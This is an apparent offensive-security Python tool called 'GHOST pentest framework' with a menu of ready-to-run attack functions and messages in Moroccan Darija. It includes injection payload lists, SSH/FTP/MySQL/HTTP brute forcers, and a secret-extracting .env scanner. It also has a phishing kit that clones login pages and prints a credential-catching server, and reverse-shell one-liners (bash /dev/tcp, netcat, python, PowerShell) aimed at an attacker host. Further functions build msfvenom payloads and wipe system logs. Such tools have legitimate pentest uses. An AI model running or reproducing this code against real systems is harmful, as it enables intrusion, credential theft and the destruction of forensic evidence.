#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""

    ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗
   ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝
   ██║  ███╗███████║██║   ██║███████╗   ██║
   ██║   ██║██╔══██║██║   ██║╚════██║   ██║
   ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║
    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝
   ┌─────────────────────────────────────────────┐
   │   G H O S T  //  PENTEST FRAMEWORK v4.0    │
   │  Recon • Vulns • Brute • OSINT • Dark • SE │
   └─────────────────────────────────────────────┘
"""
import socket, ssl, os, sys, re, json, time, hashlib, zipfile, random, string
import threading, subprocess, urllib.parse, urllib.request, urllib.error
from concurrent.futures import ThreadPoolExecutor

# ================= DESIGN / COLORS =================
class Style:
    R="\033[1;91m"; G="\033[1;92m"; Y="\033[1;93m"; B="\033[1;94m"
    M="\033[1;95m"; C="\033[1;96m"; W="\033[0m"; DIM="\033[2m"; BOLD="\033[1m"

    @staticmethod
    def banner():
        os.system("clear" if os.name!="nt" else "cls")
        print(f"""{Style.R}
    ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗
    ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝
    ██║  ███╗███████║██║   ██║███████╗   ██║
    ██║   ██║██╔══██║██║   ██║╚════██║   ██║
    ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║
     ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝{Style.W}{Style.DIM}
    ─────────────────────────────────────────────────
      G H O S T   PENTEST FRAMEWORK   v4.0
      Recon | Vulns | Brute | OSINT | Dark | SE
    ─────────────────────────────────────────────────{Style.W}""")

    @staticmethod
    def header(title):
        print(f"\n{Style.B}┌──[ {title} ]{Style.W}")
    @staticmethod
    def footer():
        print(f"{Style.B}└─────────────────────────────{Style.W}")
    @staticmethod
    def line():
        print(f"{Style.DIM}  {'─'*46}{Style.W}")

s=Style
def ok(m): print(f"  {s.G}✔{s.W} {m}")
def bad(m): print(f"  {s.R}✘{s.W} {m}")
def warn(m): print(f"  {s.Y}▸{s.W} {m}")
def hit(m): print(f"  {s.R}★ {s.BOLD}VULN:{s.W} {m}")
def info(m): print(f"  {s.C}ℹ{s.W} {m}")
def get(u,t=12,h=None):
    r=urllib.request.Request(u,headers={**{"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},**(h or {})})
    return urllib.request.urlopen(r,timeout=t).read().decode(errors="ignore")

# ================= LISTS =================
DEF_USERS=["admin","root","test","user","administrator","ubuntu","oracle","ftp"]
DEF_PASS=["admin","123456","password","admin123","12345678","root","toor","qwerty","letmein",
          "welcome","admin@123","P@ssw0rd","1234","test","passwd","12345","abc123"]

def load_list(path):
    try:
        lines=[l.strip() for l in open(path,encoding="utf-8",errors="ignore") if l.strip()]
        ok(f"Loaded {len(lines)} entries mn {path}")
        return lines
    except Exception:
        bad(f"Ma9detch nqra '{path}' - nkhdem b defaults")
        return None

def ask_lists():
    warn("Dir path dyal txt files (Enter = defaults)")
    u=input("    Users file: ").strip(); p=input("    Passwords file: ").strip()
    return (load_list(u) if u else None) or DEF_USERS, (load_list(p) if p else None) or DEF_PASS

# ================= RECON =================
def dns_recon(d):
    s.header(f"DNS RECON → {d}")
    try:
        import dns.resolver
        for t in ("A","AAAA","MX","NS","TXT","CNAME","SOA"):
            try:
                for a in dns.resolver.resolve(d,t): info(f"[{t}] {a}")
            except Exception: pass
    except ImportError:
        subprocess.run(["dig","+short","ANY",d])
        try: info(f"[A] {socket.gethostbyname(d)}")
        except Exception: bad("Maqadetch nresolvih")
    try:
        with socket.create_connection((d,443),timeout=6) as sock:
            cert=ssl.create_default_context().wrap_socket(sock,server_hostname=d).getpeercert()
            info(f"SSL Subject: {dict(x[0] for x in cert.get('subject',[])).get('commonName','?')}")
            info(f"SSL Valid until: {cert.get('notAfter')}")
    except Exception: pass
    s.footer()

def whois_lookup(d):
    s.header(f"WHOIS → {d}")
    try:
        out=subprocess.run(["whois",d],capture_output=True,text=True,timeout=15).stdout
        for l in out.split("\n"):
            if re.match(r'(Domain Name|Registrar|Creation Date|Expir|Name Server|Registrant (Organization|Country|Email))',l,re.I):
                info(l.strip())
    except Exception:
        try: print(get(f"https://api.hackertarget.com/whois/?q={d}"))
        except Exception: bad("Whois fache")
    s.footer()

def port_scan(h,ports=None):
    s.header(f"PORT SCAN → {h}")
    if ports is None:
        ports=[21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1433,1521,1723,3306,
               3389,5432,5900,6379,8000,8080,8443,8888,9090,9200,27017,50000]
    res=[]
    def sp(p):
        try:
            sk=socket.socket(); sk.settimeout(1.2)
            if sk.connect_ex((h,p))==0:
                try: sv=socket.getservbyport(p)
                except Exception: sv="?"
                ok(f"{h}:{p} OPEN ({sv})"); res.append(p)
            sk.close()
        except Exception: pass
    with ThreadPoolExecutor(max_workers=150) as ex: [ex.submit(sp,p) for p in ports]
    time.sleep(2.5)
    info(f"Total open: {len(res)}")
    s.footer(); return sorted(res)

def subnet_scan(cidr):
    s.header(f"SUBNET SCAN → {cidr}")
    try:
        import ipaddress; net=ipaddress.ip_network(cidr,strict=False)
    except Exception: bad("Format ghalat (ex: 192.168.1.0/24)"); s.footer(); return
    live=[]
    def ph(ip):
        ip=str(ip)
        try:
            sk=socket.socket(); sk.settimeout(0.8)
            if sk.connect_ex((ip,80))==0 or sk.connect_ex((ip,443))==0:
                live.append(ip); ok(f"Host UP: {ip}")
            sk.close()
        except Exception: pass
    with ThreadPoolExecutor(max_workers=200) as ex: [ex.submit(ph,i) for i in net.hosts()]
    ok(f"Alive: {len(live)}"); s.footer(); return live

SUBS=["www","mail","ftp","admin","cpanel","webmail","api","dev","test","staging","portal","vpn","ns1",
      "ns2","smtp","pop","imap","blog","shop","app","beta","cdn","git","jenkins","db","intranet","owa",
      "exchange","remote","svn","auth","login","sso","cloud","backup","old","new","demo","wp","m"]
def sub_enum(d):
    s.header(f"SUBDOMAIN ENUM → {d}")
    out=[]
    def ck(sb):
        fq=f"{sb}.{d}"
        try:
            ip=socket.gethostbyname(fq); ok(f"{fq} → {ip}"); out.append((fq,ip))
        except Exception: pass
    with ThreadPoolExecutor(max_workers=30) as ex: [ex.submit(ck,x) for x in SUBS]
    s.footer(); return out

def fingerprint(url):
    s.header(f"FINGERPRINT → {url}")
    try:
        resp=urllib.request.urlopen(urllib.request.Request(url,headers={"User-Agent":"Mozilla/5.0"}),timeout=10)
        h=dict(resp.headers); body=resp.read().decode(errors="ignore")
        info(f"Server: {h.get('Server','?')} | X-Powered-By: {h.get('X-Powered-By','?')}")
        warn("Security Headers:")
        for sh in ("Strict-Transport-Security","Content-Security-Policy","X-Frame-Options",
                   "X-Content-Type-Options","Referrer-Policy"):
            if sh not in h: print(f"    {s.R}✘ Missing: {sh}{s.W}")
            else: print(f"    {s.G}✔ {sh}{s.W}")
        for n,sig in {"WordPress":"wp-content","Joomla":"joomla","Drupal":"drupal","Laravel":"laravel_session",
                      "PHP":"\\.php","ASP.NET":"aspx","React":"react","jQuery":"jquery","Cloudflare":"cloudflare"}.items():
            if re.search(sig,body,re.I): ok(f"Tech: {n}")
        # WAF detection
        try:
            r2=urllib.request.urlopen(urllib.request.Request(url+"?id=1%20union%20select",headers={"User-Agent":"Mozilla/5.0"}),timeout=10)
        except urllib.error.HTTPError as e:
            if e.code==403: warn("WAF detected? (403 on payload)")
            if "cloudflare" in str(e.headers).lower(): hit("Cloudflare WAF")
    except Exception as e: bad(f"Error: {e}")
    s.footer()

def traceroute(host):
    s.header(f"TRACEROUTE → {host}")
    subprocess.run(["traceroute",host] if os.name!="nt" else ["tracert",host])
    s.footer()

# ================= WEB VULNS =================
def crawl_params(url):
    found=set()
    try:
        html=get(url)
        for a,b in re.findall(r'href=["\']([^"\']+)["\']|src=["\']([^"\']+)["\']',html):
            l=a or b
            if l.startswith("http") and "?" in l: found.add(l)
    except Exception as e: bad(f"Error: {e}")
    return found

SQLI_P=["'",'"',"' OR '1'='1","1' ORDER BY 1--+","' AND 1=2 UNION SELECT NULL--+","1 AND SLEEP(5)",
        "' OR 1=1#","admin'--","' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--"]
SQLI_E=[r"sql syntax",r"mysql",r"unclosed quotation",r"sqlstate",r"pg_query",r"ora-\d{5}",
        r"sqlite",r"jdbc",r"odbc",r"microsoft ole db"]
XSS_P=['<script>alert(1)</script>','"><img src=x onerror=alert(1)>','<svg onload=alert(1)>',
       "javascript:alert(1)","'-alert(1)-'","<iframe src=javascript:alert(1)>"]
RCE_P=[";id","|id","`id`","$(id)","; cat /etc/passwd"]
RCE_E=[r"uid=\d+\(\w+\)",r"root:x:0:0:"]
REDIR_P=["https://evil.com","//evil.com","https:%2f%2fevil.com"]

def inject_test(url):
    s.header(f"VULN TEST → {url}")
    p=urllib.parse.urlparse(url); q=urllib.parse.parse_qsl(p.query,keep_blank_values=True)
    if not q: bad("Ma kaynch params (dir ?id=1)"); s.footer(); return
    try: base=get(url)
    except Exception: base=""
    for k,v in q:
        tests=((SQLI_P,"SQLi",SQLI_E),(XSS_P,"XSS",None),(RCE_P,"RCE",RCE_E))
        for pl,lab,pat in tests:
            for pay in pl:
                nq=urllib.parse.urlencode([(kk,pay if kk==k else vv) for kk,vv in q])
                tu=urllib.parse.urlunparse(p._replace(query=nq))
                try:
                    t0=time.time(); body=get(tu); t=time.time()-t0
                    if pat:
                        for e in pat:
                            if re.search(e,body.lower()) and not re.search(e,base.lower()):
                                hit(f"{lab} → param='{k}' payload='{pay}'"); info(tu); break
                    if "SLEEP" in pay and t>4.5: hit(f"Time-based SQLi → '{k}' ({t:.1f}s)")
                    if lab=="XSS" and pay in body:
                        hit(f"XSS → param='{k}' payload='{pay}'"); info(tu)
                except Exception: pass
        # open redirect
        for pay in REDIR_P:
            nq=urllib.parse.urlencode([(kk,pay if kk==k else vv) for kk,vv in q])
            tu=urllib.parse.urlunparse(p._replace(query=nq))
            try:
                r=urllib.request.urlopen(urllib.request.Request(tu,headers={"User-Agent":"Mozilla/5.0"}),timeout=10)
                if "evil.com" in r.geturl(): hit(f"Open Redirect → param='{k}'"); info(tu)
            except Exception: pass
    ok("Testing salat"); s.footer()

def dirb(url,wordlist_path=None):
    s.header(f"DIR BRUTE → {url}")
    words=(load_list(wordlist_path) if wordlist_path else None) or \
          ["admin","login","uploads","backup",".git",".env","config","phpmyadmin","wp-admin",
           "wp-login.php","administrator","panel","api","console","dashboard","db","sql","shell",
           "test","tmp",".htaccess","robots.txt","server-status","info.php"]
    def ck(w):
        u=f"{url.rstrip('/')}/{w}"
        try:
            r=urllib.request.urlopen(urllib.request.Request(u,headers={"User-Agent":"Mozilla/5.0"}),timeout=8)
            if r.status==200: ok(f"/{w} [{r.status}]")
        except urllib.error.HTTPError as e:
            if e.code in (401,403): warn(f"/{w} [{e.code}]")
        except Exception: pass
    with ThreadPoolExecutor(max_workers=20) as ex: [ex.submit(ck,w) for w in words]
    s.footer()

def git_env_scan(url):
    """Scan dyal exposed .git / .env / backups"""
    s.header(f"GIT/ENV EXPOSURE SCAN → {url}")
    paths=[".git/HEAD",".git/config",".env",".env.local",".env.bak","web.config.bak",
           "backup.sql","db.sql","dump.sql",".DS_Store","composer.json","package.json"]
    def ck(p):
        u=f"{url.rstrip('/')}/{p}"
        try:
            body=urllib.request.urlopen(urllib.request.Request(u,headers={"User-Agent":"Mozilla/5.0"}),timeout=8).read().decode(errors="ignore")
            if body and "404" not in body[:200]:
                hit(f"EXPOSED: /{p}"); info(f"{u}")
                if p==".git/HEAD": print(f"    {s.DIM}{body.strip()[:100]}{s.W}")
                if p.startswith(".env"):
                    for secret in re.findall(r'(?:KEY|TOKEN|SECRET|PASS\w*)\s*=\s*\S+',body)[:5]:
                        hit(f"  SECRET: {secret}")
        except Exception: pass
    with ThreadPoolExecutor(max_workers=10) as ex: [ex.submit(ck,p) for p in paths]
    s.footer()

def cors_check(url):
    s.header(f"CORS CHECK → {url}")
    for origin in ("https://evil.com","null"):
        try:
            r=urllib.request.urlopen(urllib.request.Request(url,headers={"User-Agent":"Mozilla/5.0","Origin":origin}),timeout=10)
            acao=r.headers.get("Access-Control-Allow-Origin")
            if acao and (acao==origin or acao=="*"):
                hit(f"Permissive CORS: Origin={origin} → ACAO={acao}")
        except Exception: pass
    else: ok("CORS normal")
    s.footer()

def takeover_check(subs):
    s.header("SUBDOMAIN TAKEOVER CHECK")
    SIGNS={"github":"There isn't a GitHub Pages site here","s3":"NoSuchBucket",
           "heroku":"No such app","azure":"404 Web Site not found",
           "shopify":"There's no shop here","fastly":"Fastly error: unknown domain"}
    found=0
    for fq,_ in subs:
        try:
            import dns.resolver
            cn=[str(a) for a in dns.resolver.resolve(fq,"CNAME")]
        except Exception: continue
        for c in cn:
            for svc,sig in SIGNS.items():
                if svc in c:
                    try:
                        body=get(f"http://{fq}")
                        if sig.lower() in body.lower(): hit(f"TAKEOVER: {fq} ({svc}) CNAME={c}"); found+=1
                    except Exception: pass
    if not found: ok("Ma kaynch takeover")
    s.footer()

def email_harvest(domain):
    s.header(f"EMAIL HARVEST → {domain}")
    emails=set()
    try: emails.update(re.findall(r'[\w.+-]+@'+re.escape(domain),get(f"https://api.hackertarget.com/emailharvester/?q={domain}")))
    except Exception: pass
    for url in (f"https://{domain}",f"https://www.{domain}",f"https://{domain}/contact"):
        try: emails.update(re.findall(r'[\w.+-]+@'+re.escape(domain),get(url)))
        except Exception: pass
    if emails:
        ok(f"{len(emails)} emails:")
        for e in sorted(emails): print(f"    {s.C}{e}{s.W}")
    else: bad("Ma l9itch")
    s.footer(); return sorted(emails)

# ================= BRUTE FORCE =================
def bf_ssh(h,p=22):
    users,passes=ask_lists()
    s.header(f"SSH BRUTE → {h}:{p} ({len(users)}x{len(passes)})")
    try: import paramiko
    except ImportError: bad("pip3 install paramiko"); s.footer(); return
    for u in users:
        for pw in passes:
            try:
                c=paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                c.connect(h,port=p,username=u,password=pw,timeout=5,allow_agent=False,look_for_keys=False)
                hit(f"SSH VALID: {u}:{pw}"); c.close(); s.footer(); return
            except Exception: continue
    bad("Salat, walo"); s.footer()

def bf_ftp(h,p=21):
    from ftplib import FTP
    users,passes=ask_lists()
    s.header(f"FTP BRUTE → {h}:{p} ({len(users)}x{len(passes)})")
    for u in users:
        for pw in passes:
            try:
                f=FTP(); f.connect(h,p,timeout=5); f.login(u,pw)
                hit(f"FTP VALID: {u}:{pw}"); f.quit(); s.footer(); return
            except Exception: continue
    bad("Walo"); s.footer()

def bf_mysql(h,p=3306):
    users,passes=ask_lists()
    s.header(f"MYSQL BRUTE → {h}:{p}")
    try: import pymysql
    except ImportError: bad("pip3 install pymysql"); s.footer(); return
    for u in users:
        for pw in passes:
            try:
                pymysql.connect(host=h,port=p,user=u,password=pw,connect_timeout=5)
                hit(f"MySQL VALID: {u}:{pw}"); s.footer(); return
            except Exception: continue
    bad("Walo"); s.footer()

def bf_http(base,path="/login"):
    users,passes=ask_lists()
    s.header(f"HTTP BRUTE → {base}{path}")
    f1=input("    User field [username]: ").strip() or "username"
    f2=input("    Pass field [password]: ").strip() or "password"
    for u in users:
        for pw in passes:
            d=urllib.parse.urlencode({f1:u,f2:pw}).encode()
            try:
                r=urllib.request.urlopen(base.rstrip('/')+path,data=d,timeout=10)
                b=r.read().decode(errors="ignore").lower()
                if not any(x in b for x in("wrong","invalid","failed","incorrect")):
                    warn(f"Possible: {u}:{pw}")
            except Exception: pass
    ok("Salat - verify manually"); s.footer()

def zip_crack(zp):
    users,passes=ask_lists()
    s.header(f"ZIP CRACK → {zp}")
    try: z=zipfile.ZipFile(zp)
    except Exception: bad("File khayb"); s.footer(); return
    for pw in passes:
        try:
            z.extractall(pwd=pw.encode()); hit(f"ZIP PASSWORD: {pw}"); s.footer(); return
        except Exception: continue
    bad("Walo"); s.footer()

def hash_crack(h,wordlist_path=None):
    h=h.strip()
    s.header(f"HASH CRACK → {h[:24]}...")
    algo=None
    for n,ln in {"md5":32,"sha1":40,"sha256":64,"sha512":128}.items():
        if len(h)==ln: algo=n; ok(f"Type: {n.upper()}"); break
    if not algo: bad("Format ma3roufch"); s.footer(); return
    pws=(load_list(wordlist_path) if wordlist_path else None) or DEF_PASS
    for pw in pws:
        if hashlib.new(algo,pw.encode()).hexdigest()==h.lower(): hit(f"CRACKED: {pw}"); s.footer(); return
    bad("Walo. dir hashcat: hashcat -m 0 -a 0 hash.txt rockyou.txt"); s.footer()

# ================= OSINT / DORKS / DARK =================
GOOGLE_DORKS=['site:{d} inurl:admin','site:{d} inurl:login','site:{d} ext:sql|ext:bak|ext:env',
              'site:{d} "index of"','site:{d} inurl:"/wp-content"','intitle:"index of" "{d}"',
              'site:{d} inurl:upload','site:{d} ext:log "password"','inurl:"{d}" password',
              'site:pastebin.com "{d}"','site:github.com "{d}" password','site:linkedin.com "{d}"']
def dorks(d):
    s.header(f"GOOGLE DORKS → {d}")
    for t in GOOGLE_DORKS:
        q=t.format(d=d)
        print(f"  {s.C}{q}{s.W}")
        print(f"    {s.DIM}→ https://www.google.com/search?q={urllib.parse.quote(q)}{s.W}")
    try:
        html=get(f"https://html.duckduckgo.com/html/?q=site:{d}+inurl:admin")
        for m in re.findall(r'class="result__a" href="([^"]+)"',html)[:10]:
            ok(f"DDG: {urllib.parse.unquote(m)}")
    except Exception: bad("DDG blocked")
    s.footer()

def osint(d):
    s.header(f"OSINT FULL → {d}")
    whois_lookup(d)
    try:
        r=get(f"https://web.archive.org/cdx/search/cdx?url=*.{d}/*&output=text&fl=original&collapse=urlkey&limit=50")
        warn("Wayback URLs:")
        for l in r.strip().split("\n")[:50]: print(f"    {s.DIM}{l}{s.W}")
    except Exception: bad("Wayback")
    try:
        r=get(f"https://crt.sh/?q=%.{d}&output=json")
        subs=sorted({e["name_value"] for e in json.loads(r) if d in e["name_value"]})
        ok(f"crt.sh: {len(subs)} subs"); [print(f"    {x}") for x in subs[:40]]
    except Exception: bad("crt.sh")
    try: print(f"  {s.DIM}[robots.txt] {get(f'https://{d}/robots.txt')[:400]}{s.W}")
    except Exception: pass
    dorks(d)

DARK_ENGINES={"Ahmia":"https://ahmia.fi/search/?q={q}",
              "Torch":"http://xmh57jsqw45twcw3.onion/search?q={q}"}
def dark_search(q,use_tor=False):
    s.header(f"DARKWEB SEARCH → {q}")
    for name,u in DARK_ENGINES.items():
        url=u.format(q=urllib.parse.quote(q))
        if ".onion" in url and not use_tor:
            warn(f"[tor needed] {name}: {url}"); continue
        try:
            if use_tor:
                proxy=urllib.request.ProxyHandler({"http":"socks5h://127.0.0.1:9050","https":"socks5h://127.0.0.1:9050"})
                body=urllib.request.build_opener(proxy).open(urllib.request.Request(url,headers={"User-Agent":"Mozilla/5.0"}),timeout=25).read().decode(errors="ignore")
            else: body=get(url)
            links=list(dict.fromkeys(l for l in re.findall(r'href=["\'](http[^"\']+)["\']',body) if ".onion" in l))
            ok(f"{name}: {len(links)} links")
            for l in links[:15]: print(f"    {s.M}{l}{s.W}")
        except Exception as e: bad(f"{name}: {e}")
    s.footer()

# ================= PHISHING =================
def phishing_kit(target_url,lhost,lport=8080):
    s.header(f"PHISHING KIT → {target_url}")
    try:
        html=get(target_url)
        html=re.sub(r'(action=["\'])[^"\']*(["\'])',rf'\1http://{lhost}:{lport}/catch\2',html)
        html=re.sub(r'(href=["\'])/(?!/)',rf'\1{target_url}/',html)
        open("phish_clone.html","w").write(html)
        ok(f"phish_clone.html (form → {lhost}:{lport}/catch)")
    except Exception as e: bad(f"Error: {e}")
    print(f"""{s.DIM}  # catch_server.py
  import http.server
  class H(http.server.BaseHTTPRequestHandler):
      def do_POST(self):
          l=int(self.headers.get('Content-Length',0))
          print("CAPTURED:", self.rfile.read(l).decode())
          self.send_response(302); self.send_header('Location','{target_url}'); self.end_headers()
      def do_GET(self):
          self.send_response(200); self.end_headers()
          self.wfile.write(open("phish_clone.html","rb").read())
  http.server.HTTPServer(('{lhost}',{lport}),H).serve_forever(){s.W}""")
    s.footer()

def qr_phish(url):
    """QR code dyal phishing link (smishing simulation)"""
    s.header("QR PHISHING SIM")
    try:
        import qrcode
        img=qrcode.make(url); img.save("phish_qr.png")
        ok(f"phish_qr.png → {url}")
    except ImportError: bad("pip3 install qrcode[pil]")
    s.footer()

# ================= PAYLOADS / EXPLOIT =================
def revshell_gen(lhost,lport,lang="bash"):
    shells={
    "bash":f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
    "python":f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    "nc":f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
    "powershell":f"powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)}};$c.Close()\""}
    s.header(f"REVERSE SHELL → {lhost}:{lport} ({lang})")
    print(f"  {s.G}{shells.get(lang,shells['bash'])}{s.W}")
    info(f"Listener: nc -lvnp {lport}")
    s.footer()

def msfvenom_gen(lhost,lport,fmt,os_target):
    s.header("MSFVENOM PAYLOAD GEN")
    pmap={"windows":{"exe":"windows/meterpreter/reverse_tcp","dll":"windows/meterpreter/reverse_tcp"},
          "linux":{"elf":"linux/x86/meterpreter/reverse_tcp"},
          "android":{"apk":"android/meterpreter/reverse_tcp"},
          "macos":{"macho":"osx/x64/shell_reverse_tcp"}}
    ext={"exe":"exe","dll":"dll","elf":"elf","apk":"apk","macho":"macho"}[fmt]
    payload=pmap[os_target][ext]
    out=f"payload.{ext}"
    cmd=f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {ext} -o {out}"
    warn("Running..."); subprocess.run(cmd,shell=True)
    info(f"Handler: msfconsole -q -x \"use exploit/multi/handler; set payload {payload}; set LHOST {lhost}; set LPORT {lport}; run\"")
    s.footer()

def gen_wordlist(base):
    s.header(f"WORDLIST GEN → {base}")
    combos=set()
    for b in (base,base.capitalize(),base.upper()):
        combos.update([b,b+"123",b+"2024",b+"2025",b+"2026",b+"!",b+"@123",b+"@1234",
                       b+"#1",b+"_admin",b+"1234",b+"12345"])
    open("wordlist_gen.txt","w").write("\n".join(sorted(combos)))
    ok(f"wordlist_gen.txt ({len(combos)} entries)")
    s.footer()

def network_info():
    s.header("LOCAL NETWORK INFO")
    subprocess.run(["ip","a"] if os.name!="nt" else ["ipconfig"])
    subprocess.run(["arp","-a"])
    warn("Gateway/route:"); subprocess.run(["ip","route"] if os.name!="nt" else ["route","print"])
    s.footer()

def log_cleaner():
    s.header("LOG CLEANER (Linux)")
    warn("Hadchi kaymseh logs — kayn ghir f machine dyalek wla authorized lab!")
    c=input("    Confirm? (type 'YES'): ")
    if c=="YES":
        cmds=["echo '' > /var/log/auth.log","echo '' > /var/log/syslog",
              "echo '' > /var/log/apache2/access.log","echo '' > /var/log/apache2/error.log",
              "history -c && history -w"]
        for cmd in cmds: subprocess.run(cmd,shell=True); ok(cmd)
    else: bad("Cancelled")
    s.footer()

# ================= FULL AUTO =================
def full_auto():
    d=input(f"\n  {s.Y}[?] Domain:{s.W} ").strip()
    dns_recon(d); sub_enum(d); osint(d); email_harvest(d)
    port_scan(d)
    for proto in ("https","http"):
        u=f"{proto}://{d}"
        try:
            fingerprint(u); dirb(u); git_env_scan(u); cors_check(u)
            for pu in crawl_params(u): inject_test(pu)
        except Exception: continue

# ================= MENU =================
def menu():
    print(f"""
  {s.B}┌─────────────────────────────────────────────────────────┐
  │{s.W} {s.BOLD}GHOST v4.0{s.W} — {s.DIM}choose your weapon{s.W}                    {s.B}│
  └─────────────────────────────────────────────────────────┘{s.W}
  {s.M}  ⟪ RECON ⟫{s.W}
   {s.C}01{s.W} DNS + SSL Recon        {s.C}02{s.W} WHOIS              {s.C}03{s.W} Port Scanner
   {s.C}04{s.W} Subnet Scanner         {s.C}05{s.W} Subdomains         {s.C}06{s.W} Fingerprint + WAF
   {s.C}07{s.W} Traceroute             {s.C}08{s.W} Local Network Info
  {s.M}  ⟪ WEB VULNS ⟫{s.W}
   {s.C}09{s.W} Crawl + Params         {s.C}10{s.W} SQLi/XSS/RCE/Redirect  {s.C}11{s.W} Dir Brute (txt)
   {s.C}12{s.W} Git/ENV Exposure       {s.C}13{s.W} CORS Check         {s.C}14{s.W} Subdomain Takeover
   {s.C}15{s.W} Email Harvester        {s.C}16{s.W} FULL AUTO
  {s.M}  ⟪ BRUTE FORCE ⟫{s.W}
   {s.C}17{s.W} SSH {s.DIM}(txt){s.W}              {s.C}18{s.W} FTP {s.DIM}(txt){s.W}           {s.C}19{s.W} MySQL {s.DIM}(txt){s.W}
   {s.C}20{s.W} HTTP Login {s.DIM}(txt){s.W}       {s.C}21{s.W} ZIP Crack {s.DIM}(txt){s.W}     {s.C}22{s.W} Hash Crack {s.DIM}(txt){s.W}
  {s.M}  ⟪ OSINT / DARK ⟫{s.W}
   {s.C}23{s.W} OSINT Full             {s.C}24{s.W} Google Dorks       {s.C}25{s.W} Darkweb Search
  {s.M}  ⟪ SOCIAL ENG ⟫{s.W}
   {s.C}26{s.W} Phishing Kit           {s.C}27{s.W} QR Phishing
  {s.M}  ⟪ PAYLOADS / MISC ⟫{s.W}
   {s.C}28{s.W} Reverse Shell Gen      {s.C}29{s.W} MSFVenom Payloads  {s.C}30{s.W} Wordlist Gen
   {s.C}31{s.W} Log Cleaner            {s.C}32{s.W} sqlmap Helper
   {s.R} 00{s.W} Khrouj""")

def main():
    s.banner()
    while True:
        menu()
        c=input(f"  {s.Y}GHOST >{s.W} ").strip()
        try:
            if   c=="01": dns_recon(input("  Domain: ").strip())
            elif c=="02": whois_lookup(input("  Domain: ").strip())
            elif c=="03": port_scan(input("  Host/IP: ").strip())
            elif c=="04": subnet_scan(input("  CIDR: ").strip())
            elif c=="05": sub_enum(input("  Domain: ").strip())
            elif c=="06": fingerprint(input("  URL: ").strip())
            elif c=="07": traceroute(input("  Host: ").strip())
            elif c=="08": network_info()
            elif c=="09":
                for u in crawl_params(input("  URL: ").strip()): ok(f"Param: {u}")
            elif c=="10": inject_test(input("  URL b params: ").strip())
            elif c=="11": dirb(input("  URL: ").strip(), input("  Wordlist txt [Enter=default]: ").strip() or None)
            elif c=="12": git_env_scan(input("  URL: ").strip())
            elif c=="13": cors_check(input("  URL: ").strip())
            elif c=="14": takeover_check(sub_enum(input("  Domain: ").strip()))
            elif c=="15": email_harvest(input("  Domain: ").strip())
            elif c=="16": full_auto()
            elif c=="17": bf_ssh(input("  Host: ").strip())
            elif c=="18": bf_ftp(input("  Host: ").strip())
            elif c=="19": bf_mysql(input("  Host: ").strip())
            elif c=="20": bf_http(input("  Base URL: ").strip())
            elif c=="21": zip_crack(input("  Zip file: ").strip())
            elif c=="22": hash_crack(input("  Hash: ").strip(), input("  Wordlist txt [Enter=default]: ").strip() or None)
            elif c=="23": osint(input("  Domain: ").strip())
            elif c=="24": dorks(input("  Domain: ").strip())
            elif c=="25":
                dark_search(input("  Query: ").strip(), input("  Tor? y/N: ").strip().lower()=="y")
            elif c=="26":
                phishing_kit(input("  Login URL: ").strip(), input("  LHOST: ").strip(),
                             int(input("  LPORT [8080]: ").strip() or 8080))
            elif c=="27": qr_phish(input("  URL: ").strip())
            elif c=="28":
                revshell_gen(input("  LHOST: ").strip(), int(input("  LPORT: ").strip()),
                             input("  Lang bash/python/nc/powershell: ").strip() or "bash")
            elif c=="29":
                msfvenom_gen(input("  LHOST: ").strip(), int(input("  LPORT: ").strip()),
                             input("  Format exe/dll/elf/apk/macho: ").strip(), input("  OS windows/linux/android/macos: ").strip())
            elif c=="30": gen_wordlist(input("  Base word: ").strip())
            elif c=="31": log_cleaner()
            elif c=="32":
                u=input("  URL: ").strip()
                info(f"sqlmap -u '{u}' --batch --level=5 --risk=3 --tamper=space2comment --random-agent --dbs")
            elif c=="00":
                print(f"  {s.R}GHOST out... 👻{s.W}"); sys.exit(0)
        except KeyboardInterrupt: print(f"\n  {s.Y}[cancelled]{s.W}")
        except Exception as e: bad(f"Error: {e}")
        input(f"\n  {s.DIM}[Enter bach trje3 l menu]{s.W}")

if __name__=="__main__":
    try: main()
    except KeyboardInterrupt: print(f"\n  {s.R}Bye 👻{s.W}"); sys.exit(0)
